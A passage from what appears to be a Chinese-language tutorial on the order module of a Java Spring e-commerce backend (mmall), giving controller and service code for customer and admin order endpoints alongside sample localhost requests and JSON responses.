shippingVo.setReceiverProvince(shipping.getReceiverProvince()); shippingVo.setReceiverCity(shipping.getReceiverCity()); shippingVo.setReceiverDistrict(shipping.getReceiverDistrict()); shippingVo.setReceiverMobile(shipping.getReceiverMobile()); shippingVo.setReceiverZip(shipping.getReceiverZip()); shippingVo.setReceiverPhone(shippingVo.getReceiverPhone()); return shippingVo;&#125;//cleanCartprivate void cleanCart(List&lt;Cart&gt; cartList) &#123; for(Cart cart:cartList)&#123; cartMapper.deleteByPrimaryKey(cart.getId()); &#125;&#125;//reduceprivate void reduce(List&lt;OrderItem&gt; orderItemList) &#123; for(OrderItem orderItem:orderItemList)&#123; Product product = productMapper.selectByPrimaryKey(orderItem.getProductId()); product.setStock(product.getStock()-orderItem.getQuantity()); productMapper.updateByPrimaryKeySelective(product); &#125;&#125;//assembleOrderprivate Order assembleOrder(Integer userId,Integer shippingId,BigDecimal payment)&#123; Order order = new Order(); long orderNo = this.generateOrderNo(); order.setOrderNo(orderNo); order.setStatus(Const.OrderStatusEnum.NO_PAY.getCode()); order.setPostage(0); order.setPaymentType(Const.PaymentTypeEnum.ONLINE_PAY.getCode()); order.setPayment(payment); order.setUserId(userId); order.setShippingId(shippingId); //发货时间等等 //付款时间等等 int rowCount = orderMapper.insert(order); if(rowCount &gt; 0)&#123; return order; &#125; return null;&#125;//generateOrderNoprivate long generateOrderNo()&#123; long currentTime =System.currentTimeMillis(); return currentTime+new Random().nextInt(100);&#125;//getOrderTotalPriceprivate BigDecimal getOrderTotalPrice(List&lt;OrderItem&gt; orderItemList) &#123; BigDecimal payment = new BigDecimal("0"); for(OrderItem orderItem:orderItemList)&#123; payment = BigDecimalUtil.add(payment.doubleValue(),orderItem.getTotalPrice().doubleValue()); &#125; return payment;&#125;//getCartOrderItemprivate ServerResponse getCartOrderItem(Integer userId, List&lt;Cart&gt; cartList) &#123; if(CollectionUtils.isEmpty(cartList))&#123; return ServerResponse.createByErrorMessage("购物车为空"); &#125; List&lt;OrderItem&gt; orderItemList = Lists.newArrayList(); for(Cart cart:cartList)&#123; OrderItem orderItem = new OrderItem(); Product product = productMapper.selectByPrimaryKey(cart.getProductId()); //判断产品的是否在售 if(product.getStatus() != Const.ProductStatusEnum.ON_SALE.getCode())&#123; return ServerResponse.createByErrorMessage("产品不在售卖状态"); &#125; //判断产品库存是否足够 if(cart.getQuantity() &gt; product.getStock())&#123; return ServerResponse.createByErrorMessage("产品库存不够"); &#125; orderItem.setUserId(userId); orderItem.setProductId(product.getId()); orderItem.setProductImage(product.getMainImage()); orderItem.setProductName(product.getName()); orderItem.setCurrentUnitPrice(product.getPrice()); orderItem.setQuantity(cart.getQuantity()); orderItem.setTotalPrice(BigDecimalUtil.mul(cart.getQuantity(),product.getPrice().doubleValue())); orderItemList.add(orderItem); &#125; return ServerResponse.createBySuccess(orderItemList);&#125; 2.获取订单的商品信息request http://localhost:8080/order/get_order_cart_product.do success12345678910111213141516171819&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;orderItemVoList&quot;: [ &#123; &quot;orderNo&quot;: null, &quot;productId&quot;: 1, &quot;productName&quot;: &quot;iphone7&quot;, &quot;productImage&quot;: &quot;mmall/aa.jpg&quot;, &quot;currentUnitPrice&quot;: 7999, &quot;quantity&quot;: 10, &quot;totalPrice&quot;: 79990, &quot;createTime&quot;: &quot;&quot; &#125; ], &quot;imageHost&quot;: &quot;http://img.happymmall.com/&quot;, &quot;productTotalPrice&quot;: 79990 &#125;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;用户未登录&quot;&#125; controller123456789@RequestMapping("get_order_cart_product.do")@ResponseBodypublic ServerResponse getOrderCartProduct(HttpSession session)&#123; User user = (User)session.getAttribute(Const.CURRENT_USER); if(user ==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return orderService.getOrderCartProduct(user.getId());&#125; service1234567891011121314151617181920@Overridepublic ServerResponse getOrderCartProduct(Integer userId) &#123; OrderProductVo orderProductVo = new OrderProductVo(); List&lt;Cart&gt; cartList = cartMapper.selectCheckedCartByUserId(userId); ServerResponse response = this.getCartOrderItem(userId,cartList); if(!response.isSuccess())&#123; return response; &#125; List&lt;OrderItem&gt; orderItemList = (List&lt;OrderItem&gt;) response.getData(); List&lt;OrderItemVo&gt; orderItemVoList = Lists.newArrayList(); BigDecimal payment = new BigDecimal("0"); for(OrderItem orderItem:orderItemList)&#123; payment = BigDecimalUtil.add(payment.doubleValue(),orderItem.getTotalPrice().doubleValue()); orderItemVoList.add(this.assembleOrderItemVo(orderItem)); &#125; orderProductVo.setProductTotalPrice(payment); orderProductVo.setOrderItemVoList(orderItemVoList); orderProductVo.setImageHost(PropertiesUtil.getProperty("ftp.server.http.prefix")); return ServerResponse.createBySuccess(orderProductVo);&#125; 3.订单Listrequest http://localhost:8080/order/list.do?pageSize=3 success123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;pageNum&quot;: 1, &quot;pageSize&quot;: 3, &quot;size&quot;: 3, &quot;orderBy&quot;: null, &quot;startRow&quot;: 1, &quot;endRow&quot;: 3, &quot;total&quot;: 16, &quot;pages&quot;: 6, &quot;list&quot;: [ &#123; &quot;orderNo&quot;: 1485158676346, &quot;payment&quot;: 2999.11, &quot;paymentType&quot;: 1, &quot;paymentTypeDesc&quot;: &quot;在线支付&quot;, &quot;postage&quot;: 0, &quot;status&quot;: 10, &quot;statusDesc&quot;: &quot;未支付&quot;, &quot;paymentTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;sendTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;endTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;closeTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;createTime&quot;: &quot;2017-01-23 16:04:36&quot;, &quot;orderItemVoList&quot;: [ &#123; &quot;orderNo&quot;: 1485158676346, &quot;productId&quot;: 2, &quot;productName&quot;: &quot;oppo R8&quot;, &quot;productImage&quot;: &quot;mainimage.jpg&quot;, &quot;currentUnitPrice&quot;: 2999.11, &quot;quantity&quot;: 1, &quot;totalPrice&quot;: 2999.11, &quot;createTime&quot;: &quot;2017-01-23 16:04:36&quot; &#125; ], &quot;imageHost&quot;: &quot;http://img.happymmall.com/&quot;, &quot;shippingId&quot;: 5, &quot;receiverName&quot;: &quot;geely&quot;, &quot;shippingVo&quot;: null &#125;, &#123; &quot;orderNo&quot;: 1485158675516, &quot;payment&quot;: 2999.11, &quot;paymentType&quot;: 1, &quot;paymentTypeDesc&quot;: &quot;在线支付&quot;, &quot;postage&quot;: 0, &quot;status&quot;: 10, &quot;statusDesc&quot;: &quot;未支付&quot;, &quot;paymentTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;sendTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;endTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;closeTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;createTime&quot;: &quot;2017-01-23 16:04:35&quot;, &quot;orderItemVoList&quot;: [ &#123; &quot;orderNo&quot;: 1485158675516, &quot;productId&quot;: 2, &quot;productName&quot;: &quot;oppo R8&quot;, &quot;productImage&quot;: &quot;mainimage.jpg&quot;, &quot;currentUnitPrice&quot;: 2999.11, &quot;quantity&quot;: 1, &quot;totalPrice&quot;: 2999.11, &quot;createTime&quot;: &quot;2017-01-23 16:04:35&quot; &#125; ], &quot;imageHost&quot;: &quot;http://img.happymmall.com/&quot;, &quot;shippingId&quot;: 5, &quot;receiverName&quot;: &quot;geely&quot;, &quot;shippingVo&quot;: null &#125;, &#123; &quot;orderNo&quot;: 1485158675316, &quot;payment&quot;: 2999.11, &quot;paymentType&quot;: 1, &quot;paymentTypeDesc&quot;: &quot;在线支付&quot;, &quot;postage&quot;: 0, &quot;status&quot;: 10, &quot;statusDesc&quot;: &quot;未支付&quot;, &quot;paymentTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;sendTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;endTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;closeTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;createTime&quot;: &quot;2017-01-23 16:04:35&quot;, &quot;orderItemVoList&quot;: [ &#123; &quot;orderNo&quot;: 1485158675316, &quot;productId&quot;: 2, &quot;productName&quot;: &quot;oppo R8&quot;, &quot;productImage&quot;: &quot;mainimage.jpg&quot;, &quot;currentUnitPrice&quot;: 2999.11, &quot;quantity&quot;: 1, &quot;totalPrice&quot;: 2999.11, &quot;createTime&quot;: &quot;2017-01-23 16:04:35&quot; &#125; ], &quot;imageHost&quot;: &quot;http://img.happymmall.com/&quot;, &quot;shippingId&quot;: 5, &quot;receiverName&quot;: &quot;geely&quot;, &quot;shippingVo&quot;: null &#125; ], &quot;firstPage&quot;: 1, &quot;prePage&quot;: 0, &quot;nextPage&quot;: 2, &quot;lastPage&quot;: 6, &quot;isFirstPage&quot;: true, &quot;isLastPage&quot;: false, &quot;hasPreviousPage&quot;: false, &quot;hasNextPage&quot;: true, &quot;navigatePages&quot;: 8, &quot;navigatepageNums&quot;: [ 1, 2, 3, 4, 5, 6 ] &#125;&#125; fail1234&#123; &quot;status&quot;: 10, &quot;msg&quot;: &quot;用户未登录,请登录&quot;&#125; controller123456789@RequestMapping("list.do")@ResponseBodypublic ServerResponse list(HttpSession session, @RequestParam(value = "pageNum",defaultValue = "1") int pageNum, @RequestParam(value = "pageSize",defaultValue = "10") int pageSize)&#123; User user = (User)session.getAttribute(Const.CURRENT_USER); if(user ==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return orderService.getOrderList(user.getId(),pageNum,pageSize);&#125; service12345678910111213141516171819202122232425@Overridepublic ServerResponse getOrderList(Integer userId, int pageNum, int pageSize) &#123; PageHelper.startPage(pageNum,pageSize); List&lt;Order&gt; orderList = orderMapper.selectByUserId(userId); List&lt;OrderVo&gt; orderVoList = this.assembleOrderVoList(orderList,userId); PageInfo pageResult = new PageInfo(orderList); pageResult.setList(orderVoList); return ServerResponse.createBySuccess(pageResult);&#125;private List&lt;OrderVo&gt; assembleOrderVoList(List&lt;Order&gt; orderList,Integer userId)&#123; List&lt;OrderVo&gt; orderVoList = Lists.newArrayList(); for(Order order : orderList)&#123; List&lt;OrderItem&gt; orderItemList = Lists.newArrayList(); if(userId == null)&#123; //todo 管理员查询的时候 不需要传userId orderItemList = orderItemMapper.getByOrderNo(order.getOrderNo()); &#125;else&#123; orderItemList = orderItemMapper.getByOrderNoUserId(order.getOrderNo(),userId); &#125; OrderVo orderVo = assembleOrderVo(order,orderItemList); orderVoList.add(orderVo); &#125; return orderVoList;&#125; 4.订单详情detailrequest http://localhost:8080/order/detail.do?orderNo=1480515829406 success12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;orderNo&quot;: 1480515829406, &quot;payment&quot;: 30000.00, &quot;paymentType&quot;: 1, &quot;paymentTypeDesc&quot;: &quot;在线支付&quot;, &quot;postage&quot;: 0, &quot;status&quot;: 10, &quot;statusDesc&quot;: &quot;未支付&quot;, &quot;paymentTime&quot;: &quot;&quot;, &quot;sendTime&quot;: &quot;&quot;, &quot;endTime&quot;: &quot;&quot;, &quot;closeTime&quot;: &quot;&quot;, &quot;createTime&quot;: &quot;2016-11-30 22:23:49&quot;, &quot;orderItemVoList&quot;: [ &#123; &quot;orderNo&quot;: 1480515829406, &quot;productId&quot;: 1, &quot;productName&quot;: &quot;iphone7&quot;, &quot;productImage&quot;: &quot;mainimage.jpg&quot;, &quot;currentUnitPrice&quot;: 10000.00, &quot;quantity&quot;: 1, &quot;totalPrice&quot;: 10000.00, &quot;createTime&quot;: &quot;2016-11-30 22:23:49&quot; &#125;, &#123; &quot;orderNo&quot;: 1480515829406, &quot;productId&quot;: 2, &quot;productName&quot;: &quot;oppo R8&quot;, &quot;productImage&quot;: &quot;mainimage.jpg&quot;, &quot;currentUnitPrice&quot;: 20000.00, &quot;quantity&quot;: 1, &quot;totalPrice&quot;: 20000.00, &quot;createTime&quot;: &quot;2016-11-30 22:23:49&quot; &#125; ], &quot;imageHost&quot;: &quot;http://img.happymmall.com/&quot;, &quot;shippingId&quot;: 3, &quot;receiverName&quot;: &quot;geely&quot;, &quot;shippingVo&quot;: &#123; &quot;receiverName&quot;: &quot;geely&quot;, &quot;receiverPhone&quot;: &quot;0100&quot;, &quot;receiverMobile&quot;: &quot;186&quot;, &quot;receiverProvince&quot;: &quot;北京&quot;, &quot;receiverCity&quot;: &quot;北京&quot;, &quot;receiverDistrict&quot;: &quot;昌平区&quot;, &quot;receiverAddress&quot;: &quot;矩阵小区&quot;, &quot;receiverZip&quot;: &quot;100000&quot; &#125; &#125;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;没有找到订单&quot;&#125; controller123456789@RequestMapping("detail.do")@ResponseBodypublic ServerResponse detail(HttpSession session,Long orderNo)&#123; User user = (User)session.getAttribute(Const.CURRENT_USER); if(user ==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return orderService.getOrderDetail(user.getId(),orderNo);&#125; service12345678910@Overridepublic ServerResponse getOrderDetail(Integer userId, Long orderNo) &#123; Order order = orderMapper.selectByUserIdOrderNo(userId,orderNo); if(order == null)&#123; return ServerResponse.createByErrorMessage("订单不存在"); &#125; List&lt;OrderItem&gt; orderItemList = orderItemMapper.getByOrderNoUserId(orderNo,userId); OrderVo orderVo = this.assembleOrderVo(order,orderItemList); return ServerResponse.createBySuccess(orderVo);&#125; 5.取消订单request http://localhost:8080/order/cancel.do?orderNo=1480515829406 success123&#123; &quot;status&quot;: 0&#125; fail12345678910&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;该用户没有此订单&quot;&#125;或&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;此订单已付款，无法被取消&quot;&#125; controller123456789@RequestMapping("cancel.do")@ResponseBodypublic ServerResponse cancel(HttpSession session, Long orderNo)&#123; User user = (User)session.getAttribute(Const.CURRENT_USER); if(user ==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return orderService.cancel(user.getId(),orderNo);&#125; service123456789101112131415161718@Overridepublic ServerResponse cancel(Integer userId, Long orderNo) &#123; Order order = orderMapper.selectByUserIdOrderNo(userId,orderNo); if(order == null)&#123; return ServerResponse.createByErrorMessage("订单不存在"); &#125; if(order.getStatus() &gt;= Const.OrderStatusEnum.PAID.getCode())&#123; return ServerResponse.createByErrorMessage("已付款，不能取消该订单了"); &#125; Order updateOrder = new Order(); updateOrder.setId(order.getId()); updateOrder.setStatus(Const.OrderStatusEnum.CANCELED.getCode()); int rowCount = orderMapper.updateByPrimaryKeySelective(updateOrder); if(rowCount &gt; 0)&#123; return ServerResponse.createBySuccess(); &#125; return ServerResponse.createByError();&#125; 后台订单接口1.订单Listrequest http://localhost:8080/manage/order/list.do?pageSize=3 success123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;pageNum&quot;: 1, &quot;pageSize&quot;: 3, &quot;size&quot;: 3, &quot;orderBy&quot;: null, &quot;startRow&quot;: 1, &quot;endRow&quot;: 3, &quot;total&quot;: 16, &quot;pages&quot;: 6, &quot;list&quot;: [ &#123; &quot;orderNo&quot;: 1485158676346, &quot;payment&quot;: 2999.11, &quot;paymentType&quot;: 1, &quot;paymentTypeDesc&quot;: &quot;在线支付&quot;, &quot;postage&quot;: 0, &quot;status&quot;: 10, &quot;statusDesc&quot;: &quot;未支付&quot;, &quot;paymentTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;sendTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;endTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;closeTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;createTime&quot;: &quot;2017-01-23 16:04:36&quot;, &quot;orderItemVoList&quot;: [ &#123; &quot;orderNo&quot;: 1485158676346, &quot;productId&quot;: 2, &quot;productName&quot;: &quot;oppo R8&quot;, &quot;productImage&quot;: &quot;mainimage.jpg&quot;, &quot;currentUnitPrice&quot;: 2999.11, &quot;quantity&quot;: 1, &quot;totalPrice&quot;: 2999.11, &quot;createTime&quot;: &quot;2017-01-23 16:04:36&quot; &#125; ], &quot;imageHost&quot;: &quot;http://img.happymmall.com/&quot;, &quot;shippingId&quot;: 5, &quot;shippingVo&quot;: null &#125;, &#123; &quot;orderNo&quot;: 1485158675516, &quot;payment&quot;: 2999.11, &quot;paymentType&quot;: 1, &quot;paymentTypeDesc&quot;: &quot;在线支付&quot;, &quot;postage&quot;: 0, &quot;status&quot;: 10, &quot;statusDesc&quot;: &quot;未支付&quot;, &quot;paymentTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;sendTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;endTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;closeTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;createTime&quot;: &quot;2017-01-23 16:04:35&quot;, &quot;orderItemVoList&quot;: [ &#123; &quot;orderNo&quot;: 1485158675516, &quot;productId&quot;: 2, &quot;productName&quot;: &quot;oppo R8&quot;, &quot;productImage&quot;: &quot;mainimage.jpg&quot;, &quot;currentUnitPrice&quot;: 2999.11, &quot;quantity&quot;: 1, &quot;totalPrice&quot;: 2999.11, &quot;createTime&quot;: &quot;2017-01-23 16:04:35&quot; &#125; ], &quot;imageHost&quot;: &quot;http://img.happymmall.com/&quot;, &quot;shippingId&quot;: 5, &quot;receiverName&quot;: &quot;geely&quot;, &quot;shippingVo&quot;: null &#125;, &#123; &quot;orderNo&quot;: 1485158675316, &quot;payment&quot;: 2999.11, &quot;paymentType&quot;: 1, &quot;paymentTypeDesc&quot;: &quot;在线支付&quot;, &quot;postage&quot;: 0, &quot;status&quot;: 10, &quot;statusDesc&quot;: &quot;未支付&quot;, &quot;paymentTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;sendTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;endTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;closeTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;createTime&quot;: &quot;2017-01-23 16:04:35&quot;, &quot;orderItemVoList&quot;: [ &#123; &quot;orderNo&quot;: 1485158675316, &quot;productId&quot;: 2, &quot;productName&quot;: &quot;oppo R8&quot;, &quot;productImage&quot;: &quot;mainimage.jpg&quot;, &quot;currentUnitPrice&quot;: 2999.11, &quot;quantity&quot;: 1, &quot;totalPrice&quot;: 2999.11, &quot;createTime&quot;: &quot;2017-01-23 16:04:35&quot; &#125; ], &quot;imageHost&quot;: &quot;http://img.happymmall.com/&quot;, &quot;shippingId&quot;: 5, &quot;receiverName&quot;: &quot;geely&quot;, &quot;shippingVo&quot;: null &#125; ], &quot;firstPage&quot;: 1, &quot;prePage&quot;: 0, &quot;nextPage&quot;: 2, &quot;lastPage&quot;: 6, &quot;isFirstPage&quot;: true, &quot;isLastPage&quot;: false, &quot;hasPreviousPage&quot;: false, &quot;hasNextPage&quot;: true, &quot;navigatePages&quot;: 8, &quot;navigatepageNums&quot;: [ 1, 2, 3, 4, 5, 6 ] &#125;&#125; fail123456789101112&#123; &quot;status&quot;: 10, &quot;msg&quot;: &quot;用户未登录,请登录&quot;&#125;或&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;没有权限&quot;&#125; controller123456789101112131415161718@RequestMapping("list.do")@ResponseBodypublic ServerResponse&lt;PageInfo&gt; orderList(HttpSession session, @RequestParam(value = "pageNum",defaultValue = "1") int pageNum, @RequestParam(value = "pageSize",defaultValue = "10") int pageSize)&#123; User user = (User)session.getAttribute(Const.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),"用户未登录,请登录管理员"); &#125; if(userService.checkAdminRole(user).isSuccess())&#123; //填充我们增加产品的业务逻辑 return orderService.manageList(pageNum,pageSize); &#125;else&#123; return ServerResponse.createByErrorMessage("无权限操作"); &#125;&#125; service123456789@Overridepublic ServerResponse&lt;PageInfo&gt; manageList(int pageNum, int pageSize) &#123; PageHelper.startPage(pageNum,pageSize); List&lt;Order&gt; orderList = orderMapper.selectAllOrder(); List&lt;OrderVo&gt; orderVoList = this.assembleOrderVoList(orderList,null); PageInfo pageResult = new PageInfo(orderList); pageResult.setList(orderVoList); return ServerResponse.createBySuccess(pageResult);&#125; 2.按订单号查询request http://localhost:8080/manage/order/search.do?orderNo=1480515829406 success123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;pageNum&quot;: 1, &quot;pageSize&quot;: 3, &quot;size&quot;: 3, &quot;orderBy&quot;: null, &quot;startRow&quot;: 1, &quot;endRow&quot;: 3, &quot;total&quot;: 16, &quot;pages&quot;: 6, &quot;list&quot;: [ &#123; &quot;orderNo&quot;: 1485158676346, &quot;payment&quot;: 2999.11, &quot;paymentType&quot;: 1, &quot;paymentTypeDesc&quot;: &quot;在线支付&quot;, &quot;postage&quot;: 0, &quot;status&quot;: 10, &quot;statusDesc&quot;: &quot;未支付&quot;, &quot;paymentTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;sendTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;endTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;closeTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;createTime&quot;: &quot;2017-01-23 16:04:36&quot;, &quot;orderItemVoList&quot;: [ &#123; &quot;orderNo&quot;: 1485158676346, &quot;productId&quot;: 2, &quot;productName&quot;: &quot;oppo R8&quot;, &quot;productImage&quot;: &quot;mainimage.jpg&quot;, &quot;currentUnitPrice&quot;: 2999.11, &quot;quantity&quot;: 1, &quot;totalPrice&quot;: 2999.11, &quot;createTime&quot;: &quot;2017-01-23 16:04:36&quot; &#125; ], &quot;imageHost&quot;: &quot;http://img.happymmall.com/&quot;, &quot;shippingId&quot;: 5, &quot;shippingVo&quot;: null &#125;, &#123; &quot;orderNo&quot;: 1485158675516, &quot;payment&quot;: 2999.11, &quot;paymentType&quot;: 1, &quot;paymentTypeDesc&quot;: &quot;在线支付&quot;, &quot;postage&quot;: 0, &quot;status&quot;: 10, &quot;statusDesc&quot;: &quot;未支付&quot;, &quot;paymentTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;sendTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;endTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;closeTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;createTime&quot;: &quot;2017-01-23 16:04:35&quot;, &quot;orderItemVoList&quot;: [ &#123; &quot;orderNo&quot;: 1485158675516, &quot;productId&quot;: 2, &quot;productName&quot;: &quot;oppo R8&quot;, &quot;productImage&quot;: &quot;mainimage.jpg&quot;, &quot;currentUnitPrice&quot;: 2999.11, &quot;quantity&quot;: 1, &quot;totalPrice&quot;: 2999.11, &quot;createTime&quot;: &quot;2017-01-23 16:04:35&quot; &#125; ], &quot;imageHost&quot;: &quot;http://img.happymmall.com/&quot;, &quot;shippingId&quot;: 5, &quot;receiverName&quot;: &quot;geely&quot;, &quot;shippingVo&quot;: null &#125;, &#123; &quot;orderNo&quot;: 1485158675316, &quot;payment&quot;: 2999.11, &quot;paymentType&quot;: 1, &quot;paymentTypeDesc&quot;: &quot;在线支付&quot;, &quot;postage&quot;: 0, &quot;status&quot;: 10, &quot;statusDesc&quot;: &quot;未支付&quot;, &quot;paymentTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;sendTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;endTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;closeTime&quot;: &quot;2017-02-11 12:27:18&quot;, &quot;createTime&quot;: &quot;2017-01-23 16:04:35&quot;, &quot;orderItemVoList&quot;: [ &#123; &quot;orderNo&quot;: 1485158675316, &quot;productId&quot;: 2, &quot;productName&quot;: &quot;oppo R8&quot;, &quot;productImage&quot;: &quot;mainimage.jpg&quot;, &quot;currentUnitPrice&quot;: 2999.11, &quot;quantity&quot;: 1, &quot;totalPrice&quot;: 2999.11, &quot;createTime&quot;: &quot;2017-01-23 16:04:35&quot; &#125; ], &quot;imageHost&quot;: &quot;http://img.happymmall.com/&quot;, &quot;shippingId&quot;: 5, &quot;receiverName&quot;: &quot;geely&quot;, &quot;shippingVo&quot;: null &#125; ], &quot;firstPage&quot;: 1, &quot;prePage&quot;: 0, &quot;nextPage&quot;: 2, &quot;lastPage&quot;: 6, &quot;isFirstPage&quot;: true, &quot;isLastPage&quot;: false, &quot;hasPreviousPage&quot;: false, &quot;hasNextPage&quot;: true, &quot;navigatePages&quot;: 8, &quot;navigatepageNums&quot;: [ 1, 2, 3, 4, 5, 6 ] &#125;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;没有找到订单&quot;&#125; controller12345678910111213141516@RequestMapping("search.do")@ResponseBodypublic ServerResponse&lt;PageInfo&gt; orderSearch(HttpSession session, Long orderNo,@RequestParam(value = "pageNum",defaultValue = "1") int pageNum, @RequestParam(value = "pageSize",defaultValue = "10")int pageSize)&#123; User user = (User)session.getAttribute(Const.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),"用户未登录,请登录管理员"); &#125; if(userService.checkAdminRole(user).isSuccess())&#123; //填充我们增加产品的业务逻辑 return orderService.manageSearch(orderNo,pageNum,pageSize); &#125;else&#123; return ServerResponse.createByErrorMessage("无权限操作"); &#125;&#125; service1234567891011121314@Overridepublic ServerResponse&lt;PageInfo&gt; manageSearch(Long orderNo, int pageNum, int pageSize) &#123; PageHelper.startPage(pageNum,pageSize); Order order = orderMapper.selectByOrderNo(orderNo); if(order != null)&#123; List&lt;OrderItem&gt; orderItemList = orderItemMapper.getByOrderNo(orderNo); OrderVo orderVo = assembleOrderVo(order,orderItemList); PageInfo pageInfo = new PageInfo(Lists.newArrayList(order)); pageInfo.setList(Lists.newArrayList(orderVo)); return ServerResponse.createBySuccess(pageInfo); &#125; return ServerResponse.createByErrorMessage("订单不存在");&#125; 3.订单详情request http://localhost:8080/manage/order/detail.do?orderNo=1480515829406 success12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;orderNo&quot;: 1480515829406, &quot;payment&quot;: 30000.00, &quot;paymentType&quot;: 1, &quot;paymentTypeDesc&quot;: &quot;在线支付&quot;, &quot;postage&quot;: 0, &quot;status&quot;: 10, &quot;statusDesc&quot;: &quot;未支付&quot;, &quot;paymentTime&quot;: &quot;&quot;, &quot;sendTime&quot;: &quot;&quot;, &quot;endTime&quot;: &quot;&quot;, &quot;closeTime&quot;: &quot;&quot;, &quot;createTime&quot;: &quot;2016-11-30 22:23:49&quot;, &quot;orderItemVoList&quot;: [ &#123; &quot;orderNo&quot;: 1480515829406, &quot;productId&quot;: 1, &quot;productName&quot;: &quot;iphone7&quot;, &quot;productImage&quot;: &quot;mainimage.jpg&quot;, &quot;currentUnitPrice&quot;: 10000.00, &quot;quantity&quot;: 1, &quot;totalPrice&quot;: 10000.00, &quot;createTime&quot;: &quot;2016-11-30 22:23:49&quot; &#125;, &#123; &quot;orderNo&quot;: 1480515829406, &quot;productId&quot;: 2, &quot;productName&quot;: &quot;oppo R8&quot;, &quot;productImage&quot;: &quot;mainimage.jpg&quot;, &quot;currentUnitPrice&quot;: 20000.00, &quot;quantity&quot;: 1, &quot;totalPrice&quot;: 20000.00, &quot;createTime&quot;: &quot;2016-11-30 22:23:49&quot; &#125; ], &quot;imageHost&quot;: &quot;http://img.happymmall.com/&quot;, &quot;shippingId&quot;: 3, &quot;receiverName&quot;: &quot;geely&quot;, &quot;shippingVo&quot;: &#123; &quot;receiverName&quot;: &quot;geely&quot;, &quot;receiverPhone&quot;: &quot;0100&quot;, &quot;receiverMobile&quot;: &quot;186&quot;, &quot;receiverProvince&quot;: &quot;北京&quot;, &quot;receiverCity&quot;: &quot;北京&quot;, &quot;receiverDistrict&quot;: &quot;昌平区&quot;, &quot;receiverAddress&quot;: &quot;矩阵小区&quot;, &quot;receiverZip&quot;: &quot;100000&quot; &#125; &#125;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;没有找到订单&quot;&#125; controller1234567891011121314151617@RequestMapping("detail.do")@ResponseBodypublic ServerResponse&lt;OrderVo&gt; orderDetail(HttpSession session, Long orderNo)&#123; User user = (User)session.getAttribute(Const.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),"用户未登录,请登录管理员"); &#125; if(userService.checkAdminRole(user).isSuccess())&#123; //填充我们增加产品的业务逻辑 return 